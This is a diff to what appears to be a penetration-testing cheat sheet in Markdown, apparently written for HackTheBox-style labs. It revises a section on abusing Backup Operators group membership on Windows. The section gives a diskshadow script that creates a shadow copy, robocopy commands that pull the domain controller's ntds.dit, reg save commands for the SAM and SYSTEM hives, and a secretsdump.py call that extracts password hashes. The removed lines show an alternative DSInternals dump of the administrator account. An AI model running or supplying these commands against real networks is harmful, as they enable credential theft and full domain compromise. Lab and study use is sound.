@@ -533,33 +533,21 @@ icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
 <details>
  <summary><strong>Backup Operators group</strong></summary>
 
-```
-diskshadow.exe
-
-DISKSHADOW> set verbose on
-DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
-DISKSHADOW> set context clientaccessible
-DISKSHADOW> set context persistent
-DISKSHADOW> begin backup
-DISKSHADOW> add volume C: alias cdrive
-DISKSHADOW> create
-DISKSHADOW> expose %cdrive% E:
-DISKSHADOW> end backup
-DISKSHADOW> exit
+```bash
+# vss.dsh
+set context persistent nowriters
+add volume c: alias viper
+create
+expose %viper% x:
 ```
 ```powershell
-Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+diskshadow /s vss.dsh
 
-robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+robocopy /b x:\windows\ntds . ntds.dit
 
-reg save HKLM\SYSTEM system
+reg save HKLM\SAM SAM
 
-reg save HKLM\SAM sam
-```
-```powershell
-Import-Module .\DSInternals.psd1
-$key = Get-BootKey -SystemHivePath .\SYSTEM
-Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+reg save HKLM\SYSTEM SYSTEM
 ```
 ```bash
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
